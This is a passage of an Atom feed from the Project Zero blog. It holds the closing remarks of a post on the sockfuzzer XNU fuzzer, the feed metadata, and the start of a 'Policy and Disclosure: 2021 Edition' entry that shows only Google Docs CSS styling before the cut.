fixes and improvements directly. Maintaining internal branches for upcoming product launches while keeping most development open has helped Chromium and Android security, and I believe XNU&amp;rsquo;s development could follow this model. As software engineering grows as a field, our experience has shown us that open, shared, and continuous development has a real impact on software quality and stability by improving developer productivity. If you don&amp;rsquo;t invest in CI, unit testing, security reviews, and fuzzing, attackers may do that for you - and users pay the cost whether they recognize it or not.&lt;/span&gt;&lt;/p&gt;&lt;div&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/2714099021755665939/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/04/designing-sockfuzzer-network-syscall.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2714099021755665939" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2714099021755665939" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/04/designing-sockfuzzer-network-syscall.html" title="Designing sockfuzzer, a network syscall fuzzer for XNU" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-HwxE_MXlYoI/YIG6aLGWsaI/AAAAAAAAa20/YcBFKqWUz986Vdarnr8YgdV8NODRM0AKgCNcBGAsYHQ/s72-c/image3.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-8627741980922328390</id>
    <published>2021-04-15T09:02:00.000-07:00</published>
    <updated>2021-04-15T09:02:28.046-07:00</updated>
    <title type="text">Policy and Disclosure: 2021 Edition</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=DFQxm4rd7fRHgM9OTejWVT5Vho6BE7M80rHXEVKqXWdbV0WvE1cEyAoIq5yYZlSc');.lst-kix_n4p12ux2ttpf-7&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-7}.lst-kix_rmtg91ibosyw-5&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-5}.lst-kix_hsa2mdcw8ezl-8&gt;li:before{content:"\0025a0  "}.lst-kix_7p3d4w3cmyya-3&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-3}.lst-kix_hsa2mdcw8ezl-7&gt;li:before{content:"\0025cb  "}.lst-kix_dig7rs8e4m8q-3&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-3}.lst-kix_hsa2mdcw8ezl-4&gt;li:before{content:"\0025cb  "}.lst-kix_hsa2mdcw8ezl-6&gt;li:before{content:"\0025cf  "}.lst-kix_hsa2mdcw8ezl-1&gt;li:before{content:"\0025cb  "}.lst-kix_hsa2mdcw8ezl-5&gt;li:before{content:"\0025a0  "}.lst-kix_hsa2mdcw8ezl-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_dig7rs8e4m8q-2.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-2 0}.lst-kix_hsa2mdcw8ezl-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_fyc7bvwifwx-2.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-2 0}.lst-kix_rmtg91ibosyw-5&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-5,lower-roman) ". "}.lst-kix_rmtg91ibosyw-7&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-7,lower-latin) ". "}.lst-kix_rmtg91ibosyw-4&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-4,lower-latin) ". "}.lst-kix_rmtg91ibosyw-8&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-8,lower-roman) ". "}ol.lst-kix_wztke9q34ehj-0.start{counter-reset:lst-ctn-kix_wztke9q34ehj-0 1}ol.lst-kix_wq9tqalf23mu-6.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-6 0}.lst-kix_w50gxariue8t-3&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-3}.lst-kix_rmtg91ibosyw-6&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-6,decimal) ". "}ol.lst-kix_7p3d4w3cmyya-3.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-3 0}.lst-kix_fyc7bvwifwx-6&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-6}.lst-kix_rmtg91ibosyw-0&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-0,decimal) ". "}.lst-kix_9568v5o897ln-2&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-2}.lst-kix_rmtg91ibosyw-1&gt;li:before{content:"\0025cb  "}.lst-kix_rmtg91ibosyw-3&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-3,decimal) ". "}.lst-kix_rmtg91ibosyw-2&gt;li:before{content:"" counter(lst-ctn-kix_rmtg91ibosyw-2,lower-roman) ". "}ol.lst-kix_rmtg91ibosyw-0.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-0 0}ol.lst-kix_dig7rs8e4m8q-7.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-7 0}ol.lst-kix_9568v5o897ln-3.start{counter-reset:lst-ctn-kix_9568v5o897ln-3 0}ol.lst-kix_rmtg91ibosyw-7.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-7 0}.lst-kix_dig7rs8e4m8q-7&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-7}.lst-kix_xxbp3lkvfgkz-0&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-0}ol.lst-kix_wztke9q34ehj-5.start{counter-reset:lst-ctn-kix_wztke9q34ehj-5 0}ol.lst-kix_w50gxariue8t-5.start{counter-reset:lst-ctn-kix_w50gxariue8t-5 0}ol.lst-kix_wztke9q34ehj-7{list-style-type:none}ol.lst-kix_wztke9q34ehj-6{list-style-type:none}ol.lst-kix_wztke9q34ehj-5{list-style-type:none}ol.lst-kix_wztke9q34ehj-4{list-style-type:none}.lst-kix_fyc7bvwifwx-2&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-2}ol.lst-kix_wztke9q34ehj-8{list-style-type:none}.lst-kix_wq9tqalf23mu-4&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-4}ol.lst-kix_n4p12ux2ttpf-7.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-7 0}.lst-kix_xxbp3lkvfgkz-6&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-6,decimal) ". "}ol.lst-kix_7p3d4w3cmyya-5.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-5 0}ol.lst-kix_9568v5o897ln-5.start{counter-reset:lst-ctn-kix_9568v5o897ln-5 0}.lst-kix_xxbp3lkvfgkz-4&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-4,lower-latin) ". "}.lst-kix_xxbp3lkvfgkz-8&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-8,lower-roman) ". "}ol.lst-kix_xxbp3lkvfgkz-3.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-3 0}ol.lst-kix_wztke9q34ehj-3{list-style-type:none}ol.lst-kix_wztke9q34ehj-2{list-style-type:none}ol.lst-kix_wztke9q34ehj-1{list-style-type:none}ol.lst-kix_wztke9q34ehj-0{list-style-type:none}.lst-kix_xxbp3lkvfgkz-0&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-0,decimal) ". "}ol.lst-kix_fyc7bvwifwx-4.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-4 0}ol.lst-kix_9568v5o897ln-8.start{counter-reset:lst-ctn-kix_9568v5o897ln-8 0}.lst-kix_xxbp3lkvfgkz-2&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-2,lower-roman) ". "}.lst-kix_w50gxariue8t-0&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-0}.lst-kix_fyc7bvwifwx-3&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-3}.lst-kix_wq9tqalf23mu-8&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-8}ol.lst-kix_dig7rs8e4m8q-4.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-4 0}.lst-kix_n4p12ux2ttpf-3&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-3}.lst-kix_7p3d4w3cmyya-7&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-7}ol.lst-kix_w50gxariue8t-8.start{counter-reset:lst-ctn-kix_w50gxariue8t-8 0}.lst-kix_wztke9q34ehj-3&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-3}ol.lst-kix_wztke9q34ehj-2.start{counter-reset:lst-ctn-kix_wztke9q34ehj-2 0}.lst-kix_n4p12ux2ttpf-4&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-4}ol.lst-kix_xxbp3lkvfgkz-1.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-1 0}ol.lst-kix_fyc7bvwifwx-7.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-7 0}ol.lst-kix_wq9tqalf23mu-8.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-8 0}ol.lst-kix_n4p12ux2ttpf-0{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-4{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-3{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-2{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-1{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-8{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-7{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-6{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-5{list-style-type:none}.lst-kix_hsa2mdcw8ezl-0&gt;li:before{content:"" counter(lst-ctn-kix_hsa2mdcw8ezl-0,decimal) ". "}ol.lst-kix_fyc7bvwifwx-2{list-style-type:none}ol.lst-kix_fyc7bvwifwx-1{list-style-type:none}ol.lst-kix_7p3d4w3cmyya-8.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-8 0}ol.lst-kix_fyc7bvwifwx-4{list-style-type:none}.lst-kix_xxbp3lkvfgkz-4&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-4}ol.lst-kix_fyc7bvwifwx-3{list-style-type:none}ol.lst-kix_fyc7bvwifwx-6{list-style-type:none}ol.lst-kix_fyc7bvwifwx-5{list-style-type:none}ol.lst-kix_fyc7bvwifwx-8{list-style-type:none}ol.lst-kix_fyc7bvwifwx-7{list-style-type:none}ol.lst-kix_fyc7bvwifwx-0{list-style-type:none}.lst-kix_w50gxariue8t-7&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-7}.lst-kix_fyc7bvwifwx-7&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-7}.lst-kix_wq9tqalf23mu-7&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-7,lower-latin) ". "}ol.lst-kix_n4p12ux2ttpf-0.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-0 0}.lst-kix_n4p12ux2ttpf-5&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-5,lower-roman) ". "}.lst-kix_9568v5o897ln-0&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-0,decimal) ". "}.lst-kix_wq9tqalf23mu-4&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-4,lower-latin) ". "}.lst-kix_wq9tqalf23mu-3&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-3}ol.lst-kix_fyc7bvwifwx-5.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-5 0}.lst-kix_7p3d4w3cmyya-2&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-2}.lst-kix_wq9tqalf23mu-3&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-3,decimal) ". "}ol.lst-kix_9568v5o897ln-1.start{counter-reset:lst-ctn-kix_9568v5o897ln-1 0}.lst-kix_n4p12ux2ttpf-6&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-6,decimal) ". "}.lst-kix_rmtg91ibosyw-6&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-6}.lst-kix_wq9tqalf23mu-0&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-0,decimal) ". "}.lst-kix_xxbp3lkvfgkz-3&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-3}ol.lst-kix_wq9tqalf23mu-2{list-style-type:none}ol.lst-kix_wq9tqalf23mu-0{list-style-type:none}ol.lst-kix_wq9tqalf23mu-6{list-style-type:none}ol.lst-kix_wq9tqalf23mu-5{list-style-type:none}.lst-kix_wq9tqalf23mu-5&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-5}ol.lst-kix_w50gxariue8t-7.start{counter-reset:lst-ctn-kix_w50gxariue8t-7 0}ol.lst-kix_wq9tqalf23mu-3.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-3 0}ol.lst-kix_wq9tqalf23mu-4{list-style-type:none}ol.lst-kix_wq9tqalf23mu-3{list-style-type:none}ol.lst-kix_wq9tqalf23mu-8{list-style-type:none}ol.lst-kix_wq9tqalf23mu-7{list-style-type:none}.lst-kix_9568v5o897ln-8&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-8,lower-roman) ". "}.lst-kix_n4p12ux2ttpf-2&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-2,lower-roman) ". "}.lst-kix_n4p12ux2ttpf-1&gt;li:before{content:"" counter(lst-ctn-kix_n4p12ux2ttpf-1,lower-latin) ". "}.lst-kix_9568v5o897ln-7&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-7,lower-latin) ". "}ol.lst-kix_wztke9q34ehj-3.start{counter-reset:lst-ctn-kix_wztke9q34ehj-3 0}.lst-kix_7p3d4w3cmyya-4&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-4}.lst-kix_9568v5o897ln-3&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-3,decimal) ". "}.lst-kix_9568v5o897ln-4&gt;li:before{content:"" counter(lst-ctn-kix_9568v5o897ln-4,lower-latin) ". "}.lst-kix_wq9tqalf23mu-8&gt;li:before{content:"" counter(lst-ctn-kix_wq9tqalf23mu-8,lower-roman) ". "}.lst-kix_dig7rs8e4m8q-2&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-2}.lst-kix_fyc7bvwifwx-3&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-3,decimal) ". "}.lst-kix_7p3d4w3cmyya-2&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-2,lower-roman) ". "}.lst-kix_fyc7bvwifwx-2&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-2,lower-roman) ". "}.lst-kix_fyc7bvwifwx-6&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-6,decimal) ". "}.lst-kix_7p3d4w3cmyya-6&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-6}ol.lst-kix_n4p12ux2ttpf-5.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-5 0}ol.lst-kix_dig7rs8e4m8q-0.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-0 2}.lst-kix_7p3d4w3cmyya-3&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-3,decimal) ". "}.lst-kix_dig7rs8e4m8q-0&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-0,decimal) ". "}.lst-kix_dig7rs8e4m8q-1&gt;li:before{content:"\0025cb  "}.lst-kix_w50gxariue8t-8&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-8}.lst-kix_7p3d4w3cmyya-6&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-6,decimal) ". "}.lst-kix_fyc7bvwifwx-7&gt;li:before{content:"" counter(lst-ctn-kix_fyc7bvwifwx-7,lower-latin) ". "}.lst-kix_7p3d4w3cmyya-7&gt;li:before{content:"" counter(lst-ctn-kix_7p3d4w3cmyya-7,lower-latin) ". "}ul.lst-kix_k3wfty7femh7-5{list-style-type:none}ul.lst-kix_k3wfty7femh7-6{list-style-type:none}.lst-kix_dig7rs8e4m8q-8&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-8,lower-roman) ". "}ul.lst-kix_k3wfty7femh7-3{list-style-type:none}ul.lst-kix_k3wfty7femh7-4{list-style-type:none}ul.lst-kix_k3wfty7femh7-1{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-6.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-6 0}ul.lst-kix_k3wfty7femh7-2{list-style-type:none}ul.lst-kix_k3wfty7femh7-0{list-style-type:none}.lst-kix_dig7rs8e4m8q-4&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-4,lower-latin) ". "}.lst-kix_dig7rs8e4m8q-5&gt;li:before{content:"" counter(lst-ctn-kix_dig7rs8e4m8q-5,lower-roman) ". "}.lst-kix_n4p12ux2ttpf-2&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-2}ul.lst-kix_k3wfty7femh7-7{list-style-type:none}ul.lst-kix_k3wfty7femh7-8{list-style-type:none}.lst-kix_fyc7bvwifwx-5&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-5}.lst-kix_wq9tqalf23mu-7&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-7}ol.lst-kix_wq9tqalf23mu-4.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-4 0}ol.lst-kix_9568v5o897ln-2.start{counter-reset:lst-ctn-kix_9568v5o897ln-2 0}.lst-kix_w50gxariue8t-8&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-8,lower-roman) ". "}.lst-kix_xxbp3lkvfgkz-5&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-5,lower-roman) ". "}ol.lst-kix_fyc7bvwifwx-1.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-1 0}ol.lst-kix_w50gxariue8t-3.start{counter-reset:lst-ctn-kix_w50gxariue8t-3 0}.lst-kix_9568v5o897ln-5&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-5}.lst-kix_wztke9q34ehj-6&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-6}ol.lst-kix_n4p12ux2ttpf-4.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-4 0}.lst-kix_w50gxariue8t-0&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-0,decimal) ". "}ol.lst-kix_wztke9q34ehj-7.start{counter-reset:lst-ctn-kix_wztke9q34ehj-7 0}.lst-kix_w50gxariue8t-4&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-4,lower-latin) ". "}.lst-kix_xxbp3lkvfgkz-1&gt;li:before{content:"" counter(lst-ctn-kix_xxbp3lkvfgkz-1,lower-latin) ". "}ol.lst-kix_n4p12ux2ttpf-1.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-1 0}.lst-kix_k3wfty7femh7-7&gt;li:before{content:"\0025cb  "}.lst-kix_fyc7bvwifwx-0&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-0}ol.lst-kix_w50gxariue8t-0.start{counter-reset:lst-ctn-kix_w50gxariue8t-0 1}.lst-kix_wq9tqalf23mu-0&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-0}.lst-kix_n4p12ux2ttpf-0&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-0}.lst-kix_k3wfty7femh7-3&gt;li:before{content:"\0025cf  "}.lst-kix_xxbp3lkvfgkz-8&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-8}ol.lst-kix_wq9tqalf23mu-2.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-2 0}ol.lst-kix_n4p12ux2ttpf-2.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-2 0}.lst-kix_rmtg91ibosyw-8&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-8}ol.lst-kix_9568v5o897ln-0.start{counter-reset:lst-ctn-kix_9568v5o897ln-0 0}ul.lst-kix_wq9tqalf23mu-1{list-style-type:none}ol.lst-kix_w50gxariue8t-0{list-style-type:none}ol.lst-kix_w50gxariue8t-5{list-style-type:none}ol.lst-kix_w50gxariue8t-4{list-style-type:none}ol.lst-kix_w50gxariue8t-3{list-style-type:none}.lst-kix_dig7rs8e4m8q-0&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-0}ol.lst-kix_w50gxariue8t-2{list-style-type:none}ol.lst-kix_w50gxariue8t-2.start{counter-reset:lst-ctn-kix_w50gxariue8t-2 0}ol.lst-kix_w50gxariue8t-8{list-style-type:none}ol.lst-kix_fyc7bvwifwx-0.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-0 0}ol.lst-kix_w50gxariue8t-7{list-style-type:none}ol.lst-kix_w50gxariue8t-6{list-style-type:none}ol.lst-kix_wztke9q34ehj-8.start{counter-reset:lst-ctn-kix_wztke9q34ehj-8 0}.lst-kix_xxbp3lkvfgkz-1&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-1}ol.lst-kix_n4p12ux2ttpf-3.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-3 0}ol.lst-kix_fyc7bvwifwx-8.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-8 0}.lst-kix_xxbp3lkvfgkz-2&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-2}ol.lst-kix_dig7rs8e4m8q-8.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-8 0}.lst-kix_9568v5o897ln-0&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-0}.lst-kix_w50gxariue8t-5&gt;li{counter-increment:lst-ctn-kix_w50gxariue8t-5}ol.lst-kix_xxbp3lkvfgkz-6{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-5{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-8{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-7{list-style-type:none}ol.lst-kix_wq9tqalf23mu-0.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-0 0}.lst-kix_wztke9q34ehj-1&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-1}ol.lst-kix_9568v5o897ln-4{list-style-type:none}ol.lst-kix_9568v5o897ln-3{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-0{list-style-type:none}ol.lst-kix_9568v5o897ln-2{list-style-type:none}.lst-kix_wztke9q34ehj-3&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-3,decimal) ". "}.lst-kix_wztke9q34ehj-5&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-5,lower-roman) ". "}ol.lst-kix_9568v5o897ln-1{list-style-type:none}ol.lst-kix_9568v5o897ln-4.start{counter-reset:lst-ctn-kix_9568v5o897ln-4 0}ol.lst-kix_xxbp3lkvfgkz-2{list-style-type:none}ol.lst-kix_9568v5o897ln-8{list-style-type:none}.lst-kix_wq9tqalf23mu-2&gt;li{counter-increment:lst-ctn-kix_wq9tqalf23mu-2}ol.lst-kix_xxbp3lkvfgkz-1{list-style-type:none}ol.lst-kix_9568v5o897ln-7{list-style-type:none}.lst-kix_dig7rs8e4m8q-5&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-5}ol.lst-kix_xxbp3lkvfgkz-4{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-7.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-7 0}ol.lst-kix_9568v5o897ln-6{list-style-type:none}.lst-kix_wztke9q34ehj-2&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-2,lower-roman) ". "}.lst-kix_wztke9q34ehj-6&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-6,decimal) ". "}ol.lst-kix_xxbp3lkvfgkz-3{list-style-type:none}ol.lst-kix_9568v5o897ln-5{list-style-type:none}ol.lst-kix_hsa2mdcw8ezl-0.start{counter-reset:lst-ctn-kix_hsa2mdcw8ezl-0 0}ol.lst-kix_w50gxariue8t-4.start{counter-reset:lst-ctn-kix_w50gxariue8t-4 0}.lst-kix_wztke9q34ehj-4&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-4,lower-latin) ". "}.lst-kix_rmtg91ibosyw-7&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-7}ul.lst-kix_rmtg91ibosyw-1{list-style-type:none}ol.lst-kix_n4p12ux2ttpf-8.start{counter-reset:lst-ctn-kix_n4p12ux2ttpf-8 0}.lst-kix_wztke9q34ehj-1&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-1,lower-latin) ". "}.lst-kix_wztke9q34ehj-0&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-0,decimal) ". "}ol.lst-kix_wztke9q34ehj-6.start{counter-reset:lst-ctn-kix_wztke9q34ehj-6 0}.lst-kix_wztke9q34ehj-8&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-8}ol.lst-kix_wq9tqalf23mu-5.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-5 0}.lst-kix_rmtg91ibosyw-3&gt;li{counter-increment:lst-ctn-kix_rmtg91ibosyw-3}.lst-kix_wztke9q34ehj-7&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-7,lower-latin) ". "}.lst-kix_xxbp3lkvfgkz-6&gt;li{counter-increment:lst-ctn-kix_xxbp3lkvfgkz-6}ol.lst-kix_9568v5o897ln-0{list-style-type:none}ol.lst-kix_7p3d4w3cmyya-4.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-4 0}.lst-kix_9568v5o897ln-7&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-7}.lst-kix_wztke9q34ehj-8&gt;li:before{content:"" counter(lst-ctn-kix_wztke9q34ehj-8,lower-roman) ". "}ul.lst-kix_7p3d4w3cmyya-1{list-style-type:none}.lst-kix_n4p12ux2ttpf-5&gt;li{counter-increment:lst-ctn-kix_n4p12ux2ttpf-5}.lst-kix_fyc7bvwifwx-8&gt;li{counter-increment:lst-ctn-kix_fyc7bvwifwx-8}ol.lst-kix_rmtg91ibosyw-6.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-6 0}.lst-kix_wztke9q34ehj-5&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-5}ol.lst-kix_fyc7bvwifwx-3.start{counter-reset:lst-ctn-kix_fyc7bvwifwx-3 0}ol.lst-kix_wztke9q34ehj-4.start{counter-reset:lst-ctn-kix_wztke9q34ehj-4 0}ol.lst-kix_wq9tqalf23mu-7.start{counter-reset:lst-ctn-kix_wq9tqalf23mu-7 0}.lst-kix_w50gxariue8t-7&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-7,lower-latin) ". "}ol.lst-kix_wztke9q34ehj-1.start{counter-reset:lst-ctn-kix_wztke9q34ehj-1 0}.lst-kix_w50gxariue8t-1&gt;li:before{content:"\0025cb  "}.lst-kix_7p3d4w3cmyya-8&gt;li{counter-increment:lst-ctn-kix_7p3d4w3cmyya-8}.lst-kix_w50gxariue8t-5&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-5,lower-roman) ". "}.lst-kix_9568v5o897ln-4&gt;li{counter-increment:lst-ctn-kix_9568v5o897ln-4}.lst-kix_w50gxariue8t-3&gt;li:before{content:"" counter(lst-ctn-kix_w50gxariue8t-3,decimal) ". "}ol.lst-kix_w50gxariue8t-6.start{counter-reset:lst-ctn-kix_w50gxariue8t-6 0}.lst-kix_k3wfty7femh7-8&gt;li:before{content:"\0025a0  "}.lst-kix_wztke9q34ehj-4&gt;li{counter-increment:lst-ctn-kix_wztke9q34ehj-4}ol.lst-kix_rmtg91ibosyw-8.start{counter-reset:lst-ctn-kix_rmtg91ibosyw-8 0}.lst-kix_dig7rs8e4m8q-8&gt;li{counter-increment:lst-ctn-kix_dig7rs8e4m8q-8}ul.lst-kix_dig7rs8e4m8q-1{list-style-type:none}ol.lst-kix_xxbp3lkvfgkz-0.start{counter-reset:lst-ctn-kix_xxbp3lkvfgkz-0 1}.lst-kix_k3wfty7femh7-6&gt;li:before{content:"\0025cf  "}.lst-kix_k3wfty7femh7-0&gt;li:before{content:"\0025cf  "}.lst-kix_k3wfty7femh7-4&gt;li:before{content:"\0025cb  "}.lst-kix_k3wfty7femh7-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_hsa2mdcw8ezl-0{list-style-type:none}ol.lst-kix_dig7rs8e4m8q-3.start{counter-reset:lst-ctn-kix_dig7rs8e4m8q-3 0}ol.lst-kix_7p3d4w3cmyya-7.start{counter-reset:lst-ctn-kix_7p3d4w3cmyya-7 